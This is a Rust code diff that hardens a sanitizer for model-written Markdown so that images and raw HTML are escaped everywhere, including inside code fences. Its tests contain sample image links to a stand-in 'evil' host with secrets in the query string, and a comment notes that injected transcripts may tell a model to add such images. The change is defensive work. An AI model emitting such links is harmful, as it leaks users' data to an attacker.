@@ -72,29 +72,13 @@ pub fn split_title(markdown: &str) -> (Option<String>, String) {
 
 /// Model-written Markdown made safe to render or export: images and raw HTML become text,
 /// so nothing in it loads by itself (a transcript can contain instructions to add one).
-/// Code blocks are left alone; they render neither.
+/// Every line is escaped, code blocks too: guessing where a block starts the way every
+/// Markdown reader does is not possible, and a stray backslash in code only shows.
 pub fn sanitize_markdown(text: &str) -> String {
-    let mut out = Vec::new();
-    let mut fence: Option<&str> = None;
-    for line in text.lines() {
-        let start = line.trim_start();
-        let marker = ["```", "~~~"]
-            .into_iter()
-            .find(|marker| start.starts_with(marker));
-        match (fence, marker) {
-            (Some(open), Some(marker)) if open == marker => {
-                fence = None;
-                out.push(line.to_owned());
-            }
-            (Some(_), _) => out.push(line.to_owned()),
-            (None, Some(marker)) => {
-                fence = Some(marker);
-                out.push(line.to_owned());
-            }
-            (None, None) => out.push(line.replace("![", "!\\[").replace('<', "\\<")),
-        }
-    }
-    out.join("\n")
+    text.lines()
+        .map(|line| line.replace("![", "!\\[").replace('<', "\\<"))
+        .collect::<Vec<_>>()
+        .join("\n")
 }
 
 /// Cut `text` into pieces of at most `max_chars` characters, preferring a line break, then a
@@ -168,12 +152,21 @@ mod tests {
     }
 
     #[test]
-    fn images_and_html_become_text_outside_code() {
+    fn images_and_html_become_text_everywhere() {
         let text = "看 ![x](https://evil/?q=secret) 和 <img src=x>\n```\n<b>code</b>\n```\n<i>";
         assert_eq!(
             sanitize_markdown(text),
-            "看 !\\[x](https://evil/?q=secret) 和 \\<img src=x>\n```\n<b>code</b>\n```\n\\<i>"
+            "看 !\\[x](https://evil/?q=secret) 和 \\<img src=x>\n```\n\\<b>code\\</b>\n```\n\\<i>"
         );
+        // Fences other readers see differently: none of them shelters an image.
+        for text in [
+            "``` a`b\n![x](https://evil/?q=1)\n```",
+            "    ```\n![x](https://evil/?q=1)",
+            "~~~\n![x](https://evil/?q=1)\n```",
+        ] {
+            let clean = sanitize_markdown(text);
+            assert!(!clean.contains("![") && clean.contains("!\\[x]"), "{clean}");
+        }
     }
 
     #[test]
